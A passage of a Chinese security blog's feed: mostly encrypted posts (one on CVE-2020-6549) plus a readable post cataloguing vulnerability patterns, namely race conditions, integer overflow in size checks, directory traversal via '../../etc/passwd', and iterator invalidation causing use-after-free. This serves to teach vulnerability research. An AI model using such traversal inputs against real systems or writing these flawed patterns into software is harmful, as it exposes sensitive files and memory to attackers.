b530a94cf819466cbc1c13955d8189f4a73f6d024add304291a147c4e092fe4fdf5f52b69ea1f6bc0a1f4f1d3734b75249be004fe88cb65c74b62b2e93d1480bc59787e6e7a845a75eab4ba05ac9256fdef71decc564bf7559b9afcd4940b0452066da366f008b30ad94ccbe977b596d7dc663614e7603dd15bcaf03fdc337bea50e71bcc375e41bbde6eb7758635ab6ce911e8eab07aaefe490d1d8af79a39f05be36da03eb4fe5bc6529648d3c75a4c4b1ca838ad70dc670bbf486c6c47230220c07cd836da0d1d257e8830fb8639085c6dafa2bc72e2ed1990d5ab7ccb11bc99918f98feb05ba366362de73ac12222e000327204197b6f8a8d9a0991672693cea07b68c7f214e0fca24b1f2c6f6d3e3861167e4e5f2d95133ddf85e38e9e2840043668943f2e2ffb9d55a8afbeddf5a166fbb66553033547902dba01acbf02e716a1a519ab10bc2b372b854714b27555dae0911d0cbbffeb73467ff4ba7bb407ffa1567ae2663153ec1204f154408d80b528ec18d4064d5e41a200fec98c18366fe7d7f096f96d2316b7581a64fff8f7b898375359434fd39b51954b3ab1ae0f4b6387f0a83d2e3b2b88c343ab5fdeef63355fd99ac7dd07df9e6fabc39502fe5e5378c882cf23447021ea89ea6e3a6a03b443ab558b8e9d1376ab47bea8c9b5a26b70586e3b0341a04b3867c8aac3b4b0950648553d16c3e598e1b3b6ccfcac8baf9b95493a1ba6a10df256d5b672de464a9885a0ba073ec835704b691a6933acbae42b35f450fd7b42b4f46c7b7c926cededda54ef53da86d24716f2c5297aa2f93206005f3d78e3d5f7becb43284b6477e2829f546c219737333a29b1a7fb18fb906fe8c28e158be7f7c5bcae5a92f7837f2f713f072083b310ffc936c121a26d3e3522d57cdb84a8003797cc31ac9672e371c84f01afe08e4f4ab3e08f6142f21143434e7f861476a48cbe2ec833c68aa0814f35484a22e92f8b1b488fe085e1d95101c9fb7377fbb02ee8d2278774d840ab8332a73d9044a06ab1659b9d6d0f38311b63a789245c82965236e3af83faa503f77ee07fb0ae556e56add2ade7c08fe923899fb43c44120b9e38b6aa22728f4192114212482c362160fb14cd290f4a0e869065c7f65086eba3b94ce6ce11803cdf2122aeab126393e3a6e1c492b1fb65f0415d4c67f7ce78a11b7c6414d1c28c91360bf56c87471b8078081e6dfe4a20c2f8fe6cc4f2d494d5423699cdcd31734ef7361b88b5393d6dddd689855d34e57eff2c468d6418ae01e897a7b62fc915cae7e259ddd68e9472fb4dbfdd898e5539dc5d73c3d735b91ccdf192f5508847c932c10ea8e69ecc26652ec48fb6f452c406b60fa19409630b672ec763849d3df6b4abbd7d9b845f05a18ee4050d42b7e7b5230573618063db95bb63a70906379f7517892f67e4bd84165c7a7be6dba834a313b2186e65eab629838c2fa9c782395a821397d3588d69a2058d79923cca23e17ad420f8823bed0497f5a95a70fb7cdc447d6c351e81690bda550a60866417df3cad4f24c7f375629b19629ed3f09f71624999b453d73903a5d4ac7886140ba8408b5f2887fc3ab118a78943bf4c06a0c1b1607fbebb981ba6635656d89ab1bc12d3cbc62823876668ba3e78e89c5bb2a884ea191cc24983a03c349b6fea83ca0c187228cec7eb5fee185df615c2acf0f2e5aaa5f85bdf2fc076e2065108805d0822efc6e8226bede905451e16ddaa83a712a5f6eb01d2fcbb6c86112c26760e001bdf3e00291ea6047e7b26a6f77966b84329d415d1800a7be6e13d86082e251b1b517d50fdec0c69e6b8f0967aed5c68188f089195b1d5d32984cd73294c3e623499d46bec8d7c3ca59f8f48a30f889047511af014c042dc6735c4c4c683d7aaf5f84a53e7a12e6df1ef1fa23516f4275ace301816b3d70bf5da78efecb1ce1a602a1cfebccf6a459d16cee52e922de08842cc7d6c4d7e8a4dc264846df24b831a7699b743e06de03b3e930270280774225f207cd25d2379590f7f324707b9c2752477c12e6cbc9160e6d3b69da99f0aac7991467c9f2cbbc9301ccc5cbacb6bc5f098c30ad722d626f287affea88caa7fc00f159590e259225bee005e38f9fb8bd9ecfac480e9901428adeb54a49aa7f1b4929113cbb9b423967505960094524a6d30160c9df22a774c4de75f825151478d9c04cc60134834799776b12802c9fe2f7cb91ece55ade3a00deea50bad33dbc91c3b7bb429e028cc76050e257296754a8b359104472b70ade8efb7f47d6c49d6c9a770d309f1bdfb2135251f59113f13b88ac78777be076a49b94a67dca81bd4499258a03e7f5259da8365e09e493d87e6d047ca44a164d0209da7ead8656891340c1b8c7e1ccf878647e9f0c959595a77cf22a26619d6339f880dce92e516af01d8adffe34ba1135321fe5b9e98ad94759c9c1b2fe7c8821561609964a838b3cf1cf110191e540c8749b71d0a96c7f7007e38da956363addb06942e33ac13dc9370ba0ab044633bcfb1ede6563cb9939609f2c6759c88e17a4a9b048d9f90794996bcb6c1a6dc4d165f1a6150099695bf48fa0f02cea0189dc3f7038126fb91a1514c614b35b8ef882ef140ac55a36d035f820d538d200e05dfd36c9966f835b161f7560093b321a0dbe8199109def29e7e0a523ec2d23fc82a945a1c4710411068d3b491ae6b50dabca1bb683d98566573fb7d2dcbfd3efdd2099465debeadd284e83678e053add516b470336e46d01a0ab6b782ac6d5ae3c0711062f6d11914ff42984b39672e3135bd8cc0f657cca7ada24d7f5ecd32a25ddfe0dd82a4bf8dceec8ae2febf27880a249adcdf41308460662fa465ba3c11ef9bb39aa54fced0a447f7330fc49a06568a9f97217ef2edfe5fa1169b19b72ec0cd36f0f8a10f2393910c5b95f4601cad14dba58a779f1e40290faebaf398da8e59c2125c9345b505f9739700165da369fd4d11bf33096e0c94cc93032815a5354cc916c681fa721b082b0f38c241c154cf3c7581ba0b9035a14df8385677e5960c74d746813d22650ddcd3f951edf8686cdd26488367dd9b4bd913d54b0cefb35947b4981c345646445b4f18022e9bcd5cb0e65f0f9c24da6bf86400a6318a0218eff48357c536257f8799bc6eb132f06271be23129c7b8122a2f6489f784d59411544ebcbc0034d9c46e075b7e19545642c46f182e4531e105f03ac403adaf2c07405ede54ead87e2a9dc95aa133af2ff81d9ff95f05a9c3f50367a380d9997fe4444158969a5bec52d84b8bf65db21634ec1379f0c971ee538ea18208651a7be32face650af2d3252bfc8aadd15a9f6a8b39ef6bd792e66811609befaf49cb23c538ffa9d8337e61d5e7f18eb8da8c56137da29cb6cb3606d6fe6f18e988111aae6e18dd059de66aa88f1165c213f75004229689aa96c56cba064235470e56ea2b8b169e3e4191aefa7a1150079eed134d7291aa990008de53cf26fd37aa3afa84fc5cc662bcce80901491b5c184facc985cd51233d0c8f06dc0834f3c113267429e65060efef3207d02026cd4a2f4266dc68b29e3b2356fdec4d112f6a801a082f5276c481b5d6567d3ce865fbbee02065c80faef34e3dd4201f1a3d33fece440a80386e57d7ebe11aef3ec8571a26164be7c2398cd162f0d68332f57dcdf5e0f8f77c0b8bb42c06fd0cfe76a8bb27cb5d220fc64c77f254f70c260140c257fbe06ff0a70c5e8e7bbac589a5d1cbf0483fa8efa905a70a0f9541aa7103d1d24022eaa0420126698e243e5ef0d8692b26bcfbf3a8690aa58634a7b0b34421d46ef23d7751a4158d9f2c83f0e5ba3ff9f328fa7e210bd8745a4a58a21c660db1361069a7d75297c29beadf1ab97e4587d4ed8f6a44daf13e2e2fc9e9c30d400eeb316bbd58e0d202464c379c8d3567c1e175d78d5ff078bec973564c70d64018757c21f49b4028697ea14b528c57e6987ac146bf3ce1754097d872353a49b1be43d386094b67635ba8cf9255598a3c2b23b6a125a3486b49ce4316215e3e7ce33e840d128689af5cac783b414966df8b1e6e59bd91bf18afaba02c494b7acd2329d864d8e77cd2af2c65b33457e9d9f896cd5b548a0f2c56d9337f33037a2e1eb0320aa2c0d3a58ecc18570a58cc049280e9f4b6cf1b492cf61ab1c71eda2f91d3af8ba0b686887b4a098deee47fb47c4d3afda0d0c82511dbbf1217ad0b4e1f646c2a8d2b1244fc3d15dc15f0ec4f089f580a8a0ac99e8312b39ad7ecd124e9b442c21dd6e636db01564de8698d3b0f8cdb696f4cfd3a4eb7e21b04bfb2ef9304d70cd2f25cf385d7b6b9f8e4f589053a834cc9033cc7faa2b434fc18cd57d43c0d33a79b9bead366a891dce2747835fdc66c2b3faa1a4a5adbb97b8dda73d49e100f6060001a57858d85e3f78e8c8aad9216dc217de3440aa33fcc74c8dac35b19c03dcf92654f44e667022fa1fc7d2effdd2daa1bb8bf66e95d0049198dab6aa625bb6a33fbb90f8dba6fde2e3708be9e30397755c3bbd1c53143adafdb9d4f13e6613d00fc0c747be71db5ad9f09bd62c7588c527768327330db8f06b9e222b80b791f168f9806927a67460a4c5baf4819b60b68823bc7e598759ff9fed444aafd314ac79929c70d59026f36f748e6991a43fb3e40a3e3b29528cc161aba661bdae6394ed603d476cd82af19dd861609dc35d6de0f3eb7b9f9f9efe6334907a377ba854ab6486b756787e262041199f8f319e442b355b8e9630514f38984904c2162b439f28c4763f5859a83f393d3ae6143d7470e12b79f633e0e96175e6413118734bff3614fcf2765563f2b02e545de8220b9861768f97dd4cbdce0c5caf4bdf3abf82dce0b364fa9492464e0863561222b649ed59d76d1a25aa82155bc413d46e3ec2c4784a4420e99c5fbea9b0dcda54edd71207982e50aa8848f90ec279243be1eafcda0eecb28a127c5f76b80dd3d246297ff2f5795e64308fa4ffc9d3ced2c4350a4626c09b220e5d1bb8b6f889378628197351d668e2e5cd5a6cbd54e4d9f2aa610eafc5f309fa97329236e0361baa326b78c1d812d4e3af77ca89062de4b21627b1733fb3f2f18006016dd5a4bcee30870f47350d77b5de2b7e3c04468f09dcc5e2cc94a28736f7f15dcffa3d68113adc8ca2aac01f90955ac3065257732955473b1cbb0e57b59ef23be26666326c3a4f2d7c30e835740cf1c5fd67590524007fbc743af7c5732ecbad9d1512fdd1128c9b6398c254e6a5db1d7aef5eaa85d0c3577b56c4883e3c3446172e734e218aed540d0af146733b5e0dbf2eb8cedecfa05b73dc00482fc3d9a8f9024aeff15d4bd7e466dfd9c4a72bb84626efe2a182d092c9163bd034579f1f973391fe4851686da523a65ad69a2db523916a22be13020b3dd526f12e00078101b9f352a13b0b890fc78697d5f35ce53038310eed8a8d32ba881821448d9a340a6312da2adaa3811c2a9ee68ce92d314969d1f5806b58321bf3a36189a1b664094921c92cade40cac65ce5b1762968726a9ad90d41492f6ec70d7ce27b5872dd55c5cdc6ef3ae575451f24990381afc4611bd72f1de414e67bc299dc60b5afd7d9f3d65350a24ddc68df403b574b95e15ab4c6c0195ecaf4ef6915924fa95be97171af9f13c35cf12c248cbefd080c48d17cb3c29bd63b710670271be2a1bebf34798dd54da63a91a2ec96a4cbccea78dade25477229973e2230978a300451f9d5d950476b8ccc2ab8420096141985dd7931dee4fbe684522d21aa350985d18856bce3e5a2479ca944e3fc78f576c1a3122e25f8ba4a87c895335bcbb48450cb76557e84c13e72fd26d2055b9d33fdfc6eae2df111afd9225f86cb2f172bf0494ee46baf3ea8fe5c27b86a79002e25055a66fb8464e586f241a6191e1339a7b3489d727cef58c0a3c479be2814431a30590a49fb38c89d6bc027f984cbe399b473a0d520b85d358ed88cf33a604c612cd75c1ad0169eac542f8359e83262c47a753609979c355968674f05a6e735cb5dce99f35d83cf9d4a4ea7ade387c3c6aa29ff3150f2cd05e71a81e1c46dd08e6651aa421f9c3e65427fe7ef4db6d066dcd55c3deba8077d0f6edb4bd0db94095f6ca7cbea89f790e56825f224d5d3cc5f479745f2eb4db59ea0a7f4ed34183bc5fe067e1dad0d784426d2622eeaea4e8a1c983df0acd0a881b5049d8a97f5dbaaf42da5da1e971215f512e33adc23fad179bdefc2446146ab9edae5101ee03a3c03143e04b47fab8a25b98a9b8be2d15c5ebef84257ca5326d2a8c3efc1bc61c70f93cc3e102b032ae10cdc2ac4bd5c121f8c144c5a8595c81b85b07b109c6b1e3c9d798a6c0984df0f071d29b7108938363edd06770923af5ed22f64e550d63662c3b1deb7d9a1f4958918af6b4f7ec3db8d08e29f378bde46eda552639758e2e511857eb113a1cf6513dd12181b6237260b6e8de1ee82b27c75264ef78559290f665d35b68e2b02eea30647926b4f6910f41ea028bfcacdb30e978fd5c124ead79eaec394876a51245b917c7af50bd292c925d1069950b7cb2a15b1db0ed7ecb5793b82ef8a3382264e4555162176546716f6e09d49ac563bccbbd73f8ff35e9d90fa0976eb8c395018769d73e3d3ec16491147f2ec98727885db627b69db1a55685665d12df60cf36f695b656f821d58485dc4895f583da401f4d42e2ed9981daa7b8158a2281fedbdd01335498c733e8129fde78298b388647995a68974dc0ac410ade251a08da41bde411f63718d5a941c849b3dfca21deb8ddcf22b382953ee773f936a1f73c7bf71aef709250c107567fd75092e7342630fcf8f18d8774b36dab1bbee5c1d48e9c1412b0b48575e0d1fa5bc01a9ff91ea7ba9059798d7defe83803a4cb41ecfeaa99e12e2d1ea4946029e822e8a60ff3b2d3a2b4a118e4a7968e36997b5b0d18e72265bb1c7e7cfc30b1cf3c7917ea0d52607f0b55d41f7689e3181918bd284633288b3dbde9572e096ab450f3074090f2fea23cfb7579f8cd5aa202f7f06a4781b61d7a5826e68dcd412806f50e2b83aa2346f1b08eec0870e75926d274d4e9aa02c739b2c9ec123314ea7ee7621db29a83e8378bb34b5481676e60960c5076b3b84a65306c80f099eb0430508975d44c95ebcaad1315182dbf015e3fb56fa7fb20d5b2f13304b0c04cb954a68721c660495bee30e773afac64cfb6ff424796114e817a86acd94e4bb3c026ba00d7d69b4b92a30b525571c83b82997321da09a22e5e5ab64dc726663654fb26024934c133ea57aa466ff615432a86ecf271f97be783cd27fac8b896c557a825a2b3b542ca5c3963a46df8a40b507620f6947e56ba1f404322bc5c5853a00a23858e640c0ef4bb80e6892f69fd66a087199e0f0922f63d596ad47945b517a37a82bdc0e864c03ad11146afc75982763ae805b7f6ea66e184210baa3250bd39809de23392c125abac811fe67617b707fe3162de8cf46b0301408d9c313f68d9240bde174815b92f0af049744f8924434b4fe6c8fe95fbd685863f0bc8d2b12dcc90509227e4b1d94521d713edc7451785c210ac324aae375771a0cff27d459f174f5484b0eb605b5fc4933626e3fd1f45e5686bfdff1131899b3ec2e34c06ed39cacd70f77a49549525ccb1a6cf9f9b2afee8d5144a0ab88e5e1c7820c04ba943940700767e66a5b86a9324a70818e1fae3054b88aa9658501fb54513f5671b6f7d11391e8829719cf2bc52669e513e50b281c6667aba4d2ab753edb3bdf4e0db16c50c4be52402a0bfdceac8a055d93f46d7671aa4622cd41768374f838eec2419b7eb89003d9513b82e953ae93f21e8288852d77114f8ba57db1297ba7cd7dbeab85a384603318c8328b5bc504384f12be30cf30de4e5b5b14704c2b95ce1a8105824136d945f0d4c17af0efc40ecc67e571dff27da3c18cfd32ae366c5d8ca1aacd3d84bc93e7377875bd506893bb16bd3e20be5e6c0ed503b1924977515082ba833cfdd6ab391000a35aeee230c5534c6fcae35478021e1bcb7d0053eedffef1cbae7f67747af8507c86f740bbd8710faa100b8d4a28cc8de684739a20f0bb8e9b2ce9421bf6c34c368bfe3e8a440aa67a028fd11df3156ec13cb4442ab135923cac638c5d3a8da4bd43eea3304858b25ed337ca9d09174de8f6eeed0ebad4d2530f614ab723e760ca9e93318ae3d7165699d3721249b724c59a3f92d96eb12793f3e0bb99b2842fa18c2ab1201aa64e816fdd4b43c2003376a8172752c4db1021c4a7736150e559378c3879898cf8f75872bc86b8f05b431c9828c3f4d01bc5eeeac96e9bf8440b40852494f33a702226067fe58d78bb9ec2ea8d8936cfd8b389017a1b14ccea10a429f06322ea9d9df1aaf85143ce583bcddc9351e89f60c38793b54991d90417ab334b4a8c5bfa9100d205926aae9ed252c85ce4d59ccb24b07a2f3138971326265d89cb2e5c84afdd649433737cf308476859031b090dec493826c966ea96cd50624c0c513cebfbc56be90d81dca1b50ce37c8b4745dd134b8349fb872bccae963c3211bade25ae21d0d607d8e0c1ee1d683ccfed2f99f3f5244b4f682c88e2640af8f46e3d7f9bf3815ddd8d8a65697cc52c6a837819e979da354dc0a68bbca380c162d500decc0aca54f186dbdc72e8996cce67284e91de1ddf3f338b7fda30dc1467b69af1477a85d45095545eea4af44ebd31b3db72346e92718357f577e671457b8bfd828d26dd1633224c75b3b440a56db4f0c3d59423b6b2ddb2f542dd4e5f694c55fd1fc8f4358cb38e6674e2c444c04bb23d4892a8b7a87b80fb144da1a55f01188408ea2bc7ab0581f381c3f0ca2cf6ccc1d0a0f9f121f21a71b7368b875edc548ab91aaf1b12dc2f8892f1ce7d6c48aeee0912f8bc75d8f8eedc305ebfa12148059ebb07851e07f332c47fbb324510d9690c8602b02589f123b75c9c751985b1d35b5426fcafec0e4f0051b63b28d9b85fa692c97ed4a1bd4fd6f25becb3fc1609ea2baaa0187289be14de077f252a3813f8051364e5d159146ebeb3947de8c0af2633f4b2f94b0fa037cc04ae27df9e3e69aa46300ea9bff5f0d2a42a8dc7dd6ba81ad5ae5d1d02755133fcb5b9f386ddd94b189b6cb757927413fffd90eaf63e418ba6cf4b6d737f6ff95df6110fa50f13274c2162a3c311256fefbd9a880db52331667ab4e202a28dc893749f35e74a0f3fd64c24f9f726de944ff0eef25e919c16fc31760bfc6170f24f03e92f083c1df0601d58fbf04deff739633246e42809975b03e661a08cc595c80a463ff3dcc8707e4065c77e471bf21fbe13189925a04a8aa8fcb7f7db2ecdfe517000eb35f7f38427b4413cd270117f679dba1f84ac0f53f5aed53360187d29a312409a3a92f3abb5c5a023012e07b09232ea9171d6922881</script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>vulnerability analysis</category>
        <category>chrome</category>
      </categories>
      <tags>
        <tag>chrome</tag>
      </tags>
  </entry>
  <entry>
    <title>一些有趣的漏洞模式</title>
    <url>/2020/10/vuln-patterns/</url>
    <content><![CDATA[<h2 id="简介">简介</h2>
<ul>
<li>这里会持续记录平常见到的一些漏洞模式</li>
</ul>
<a id="more"></a>
<h2 id="1-条件竞争">1. 条件竞争</h2>
<ul>
<li>
<p><strong>多线程</strong> 程序中，由于没有及时为资源上锁，而导致该资源被另一个线程所修改时，因为其他的不当操作而造成漏洞。</p>
</li>
<li>
<p>例子：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 多线程代码</span></span><br><span class="line"><span class="keyword">if</span>(ptr)</span><br><span class="line">&#123;</span><br><span class="line">  ...</span><br><span class="line">  <span class="comment">// 注意！user_buf是一块mmap映射的，并且未初始化的区域</span></span><br><span class="line">  copy_from_user(ptr,user_buf,len);</span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>在这个例子中，执行<code>copy_from_user</code>时，由于<code>user_buf</code>只是映射而为分配实际内存，所以当该内存被使用时，会触发内存缺页中断，使CPU执行内存缺页处理程序。此时<code>copy_from_user</code>函数将会暂停执行，等待内存缺页处理程序返回。</li>
<li>但如果在这个等待的时间中，另一个进程将指针<code>ptr</code>释放，并使某个<strong>重要结构</strong>申请到这块刚刚被释放的内存。则就可以对这个<strong>重要结构</strong>进行修改</li>
</ul>
</li>
</ul>
<h2 id="2-整数溢出">2. 整数溢出</h2>
<ul>
<li>
<p>整数之间做运算的结果超过范围，导致上溢或下溢</p>
</li>
<li>
<p>该漏洞是相当常见的，因为大多数情况下代码中都没有考虑运算的溢出</p>
</li>
<li>
<p>例子</p>
<ul>
<li>
<p>例1</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// dataLen可控</span></span><br><span class="line">ptr = <span class="built_in">realloc</span>(ptr, metaLen + dataLen);</span><br><span class="line"><span class="comment">// 当metaLen + dataLen上溢时，realloc只会分配一块较小的内存</span></span><br><span class="line"><span class="comment">// 这样就可以实现堆溢出</span></span><br></pre></td></tr></table></figure>
</li>
<li>
<p>例2</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> total_len;</span><br><span class="line"><span class="keyword">int</span> meta_len;</span><br><span class="line">...</span><br><span class="line"><span class="comment">// meta_len可控</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> data_len = total_len - meta_len;</span><br><span class="line"><span class="comment">// 此时data_len就会变的很大，例：(unsigned)(-1) = 0xFFFF</span></span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
<li>
<p>整数溢出的判别方式</p>
<ul>
<li>
<p>溢出肯定不是这么判别的（笑）</p>
<blockquote>
<p>注： 变量metaLen与dataLen都是int类型</p>
</blockquote>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// dataLen可控</span></span><br><span class="line"><span class="keyword">if</span>(metaLen + dataLen &gt; INT_MAX)</span><br><span class="line">&#123; ... &#125;</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>而通常是这样判别的</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// dataLen可控</span></span><br><span class="line"><span class="keyword">if</span>(INT_MAX - dataLen &lt; metaLen)</span><br><span class="line">&#123; ... &#125;</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>但是当判别表达式比较繁杂的时候</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// dataLen可控</span></span><br><span class="line"><span class="keyword">if</span>(INT_MAX - ( <span class="number">1</span> + dataLen + <span class="number">1</span>) &lt; metaLen)</span><br><span class="line">&#123; </span><br><span class="line">  ...</span><br><span class="line">  ptr = <span class="built_in">realloc</span>(ptr, (metaLen + <span class="number">1</span>) + (dataLen + <span class="number">1</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>此时还是会造成整数溢出。</p>
<p>所以正确的判别式应该是将<strong>用户可控变量</strong>与<strong>用户不可控变量</strong>分开</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(用户可控变量 &lt; (用户不可控变量<span class="number">1</span> op 用户不可控变量<span class="number">2</span> ...))</span><br><span class="line">&#123;</span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这方面要多加小心。</p>
</li>
</ul>
</li>
</ul>
<h2 id="3-目录遍历漏洞">3. 目录遍历漏洞</h2>
<ul>
<li>
<p>当程序对文件进行操作，需要其绝对地址时，程序会将当前工作目录的地址与程序名称进行拼接，以获得绝对地址</p>
<blockquote>
<p><code>/home/kiprey/</code> + <code>targetFilename</code> = <code>/home/kiprey/targetFilename</code></p>
</blockquote>
</li>
<li>
<p>但如果这个<code>targetFilename</code>不守规矩呢？</p>
<blockquote>
<p>例如<code>targetFilename</code> = <code>../../etc/passwd</code><br>
则此时拼接起来的绝对地址为<code>/home/kiprey/../../etc/passwd</code>，实际上就是<code>/etc/passwd</code>，指向敏感文件<br>
这便是<strong>目录遍历漏洞</strong></p>
</blockquote>
</li>
<li>
<p>可能有人会问，文件名不是不能包含<code>/</code>么？的确是这样，但数据文件中的<strong>数据</strong>却可以包含<code>/</code><br>
例如，读取某个数据文件内的数据，这个数据是某个文件名。然后获取该指定文件的绝对地址，并将其发送<br>
此时数据文件内的文件名就不受影响，可以内含反斜杠，因为此时其只是一段数据。<br>
如果这个数据文件是精心构建的，那很有可能会把敏感文件发送出去。</p>
</li>
</ul>
<h2 id="4-迭代器失效漏洞">4. 迭代器失效漏洞</h2>
<p>以CVE-2020-6541、CVE-2020-6549为例，该类漏洞大多都是按这样的一个流程来触发UAF漏洞的</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">循环迭代某个元素集合Set，以执行函数A</span><br><span class="line">    在函数A内部，执行...</span><br><span class="line">    	...</span><br><span class="line">    		在函数M内部，修改Set集合的元素个数（插入或删除元素），之后函数返回</span><br></pre></td></tr></table></figure>
<p>这样，当控制流从函数M依次向上返回至最上的迭代循环后，由于<strong>所遍历的元素集合被修改</strong>，因此<strong>下一次所使用的迭代器将失效</strong>。这样就会造成UAF漏洞。</p>
<h2 id="Continuing…">Continuing…</h2>
]]></content>
      <categories>
        <category>天问之路</category>
      </categories>
      <tags>
        <tag>vuln patterns</tag>
      </tags>
  </entry>
  <entry>
    <title>CVE-2020-6549分析</title>
    <url>/2020/10/CVE-2020-6549/</url>
    <content><![CDATA[<div id="hexo-blog-encrypt" data-wpm="密码错误，请重试。" data-whm="文章校验出错, 但仍可查看解密后的内容。"><div class="hbe-input-container"><input type="password" id="hbePass" placeholder="请输入密码" /><label>请输入密码</label><div class="bottom-line"></div></div><script id="hbeData" type="hbeData" data-hmacdigest="cf9b95c7818bdd0350a5ad528c739c8f8a6c8b6d25ed4a422f408662283a4af0">8b08ee18ea01b90fb07ded90e02ba68fa1f0af4ec808a7d1ebd62fa40b35950d4c0a438bc13eed85c89bfb40fa2e5e04507ac34ac8a24c10aa84a0973ce91a8039579d49503f83238860123ea5bd96112e3815f4154d92bc3d31dcba015aa425e18650274ab28c8eb8e64d459b4b80a3529d3ce0b7e76ccfe968c1999451fd586b8b8864ac8937dfdbf4c9a543df1376f68dc263dd2f97c2fe114174d0d9ab5de4fdac8864264816cb753b65f8bf40fc49235c120d96e1cecdfd71ab817700b1a047b24aa865484d9a4709b0e9ac82d51c4b73799175a74ae8a32714a6a3691b2b3c3ce61d93b9a6f6f0861142bf6f206ac5c3b65dba8ab3c1a684e6759153ab813a6adac0d2d50d4a48292414497f523a4298ca3daf58cb7f2f3df3ad09d4b429173c8fb4d633c6136cb611e72815e00ad996e4b6c52bfe11385eaa902b7e041fe425ea4cef50ef49160a1c26787a23ac47b865f717bb2a340c0fedd2f0490da5a4500389536f2564805b544aaa1e70789bf8a9043d1211bf2b99d511e16ff6829dee9dc867babe62ce6af0e988caf97e91d722e50ddddd3cd57bdd8e2ead966d6c929f2d3ff14682b761ebb89af25d13a5d1f5c04ed1b9ecdc5d94c1e064ed81919f7af8dc9153073ec08b8ed418b5d3c4210d11fcbc980d49f4ab986a97517a59053dad9f05e616254a32d85b2d11e22a113c92a1e9ad16679bd06679747cd6ec9feab6831885c61aee00ca3b6757ec931a19cbdd3a4ae91ac11f3763d9f163549197940c075dd418685741d151578672cd63c61c2bcecb2cbb9765b6649b60128e26cc5cf47c58135c2fb812ab5c0e1dcea609743d9b79a34cb9a1ff2c54e9dedd7984b63761520cd37fffc7277ad3e56bec01afd881abfaa2249c8a314e81244cdc6400a6185abb8e8e082b4c221a070e54936b73ddd75abd4183add43cbcb4963934e48e5e59e80f1ffda766ca8ff2b1258febe4a68d89ca63e33df2cd857f4fdc9bcd7988137a6c3bb888d95f30f0c3f27235224591525f1a212d6c55fec76d29df1fdfe61dbe5a0c0cdb01cfbcc690084e4b632bb127432e74701aa9c90a540de9b61646f48af52439e545281385ea79dcde884449b1c774e062eb1b44d5c67bb4b0b2c99a9e37683764179df5fd114b49e07bc5828033b8812bfe36803865b2045e88565a5af3727b0e98296d2d7a66c6f0c6892fa3e95ba5bde92ad06b69f194ff05e23fdaca987a691edcc578f9d98d1264756cb2ea77652ea76b49f63d85510b6de56167402c5b3a6ba4d3b67b8878f75ced2ec57059e5bc40b0a9a7e026f3d634d60c4f5e5d4e899dc6bb1d2fe86afd0334d219a00de1f0e2ee352795e6138a82afd6cba844fa8987fe288158d92fec9e40e4c9a3b6769235ef913314235ff5d490d1c09422ceefc3127ea3af41547094275f13bb328c17b85748488deb7f5c3bc43b204b025fd70f8890a74f6f549bd7cd50fd354c0ccd1a49cbdd4622ce5e3774d10fe8b71a8396445bd28d166647c5f8c4d722fa440af77826a592567bcf21b293380d5de9f22e585914da17c7f67b203e18162bc3adc4e48a457503eb991339f0d257e972c0c646f8e7b09ae75f068114e66ca0d8a0e714e4e337a22175eec7a233c35e78e198424107c57f38e7559abfc741c4ed578c787ff0a50964e64d3d782eb073af1e553cb8caa3247c6c6bf32fd9ce696c5dc7b5ae3c278969f24e4c50816c1c6d6fa56caa65e885079789726ba7f673ae652c34d407ce9c17c4a7417fa08c2eb8af72e35418f8598359d402531cdbe80aaed2b462c452a2f0bfb155e280864e7a1a0575ee3d06a54d0e498992a02fbcbfc19daa6153ce5313b348c04fc1095973fe410b44e643ad837f183f1b835e4b2fcc4803dcdef935c456e1d27006d8b7b610efa7c637e25f8d4631b07311c5e3999edf575fb0129424e53eeda7a9be1c7dee34f7df1c6ad42c8b9d4ffa30ae758359538a60c2812b3f7df99f0923a8f2ba9ce51d8aa5dd084615a50ae01ebdb1e82ae330d9789df05fdd30eb4edbca619ff4384c1e13d1080706db4e39e6c608e8c0b1cd70b02669b287c8f2697c587d5808631812eff34a45b03e2991bf157844c31474ca64fd2f81169647d25c8c7695ef9e21f209f4a88ea6f6c2a3e117cf59690810a59e314ddbade2e3ee82e458cece3add70c31cde9b621895d67994426f19c2ec9e63e3eebfb07829aee5a18e42c19d4f3fb73d55ad79a209ae309abc14980b968718cfbb2dffc37c482b566d8010a66be6630fba6a12730ffad7272bd057abb699613a78db158e918824e62399e319ba715ec3e2938b3f3cbcfef39c4ca7707dc0853fc4e1d5cb28c10ff9c8e3f842c7f10681abda8ee9041077f86c57b810f04a8552f8780b75c8b398620f198d7b2c4db1699b7b3dd067cde82a6a7162039eb235516e4c6c6d9c28aa5d7476ac005c0e1bc0c5c934d7581e244ca268356a09e6587a99e70450859b09a11e5481b1268f337e4720f507abe1d5840de16a8d2015613800aa225ddc90e9226b6cc7b2b1c793385a2309cac778d559385e2b28266e3e95e1897d58a97d47773a482f3d4d8f721bad5bc075736ddff5c99408e27aa8a178dfe70a47239af5b2bb4127168e762df3ed44c380edfae51ce3f41d245d109cf8ca5cdc7309705d5105ee70c9fc6d6e022bb2271b0e9655cde5c5452876a87d6f985f29304fb7a377a9cedd3698b254fbe570b561d53cd6d0603473386e1a726743bc6c8459ca7e73ca9cfa6f3d14d353f2f3e26b05d58ca2210a7b2218d880c42721e2a558b7b4f49e0bdcf888b7258306ef22d838429ec958379b6152fe16929f29dbb657755bbab10c42db1e232735dcca887526e64f0dd4d74916bf6ec49e39ccbd6fb0338f5f4a1d39fc5964ac59ed661dd2c5e47bbf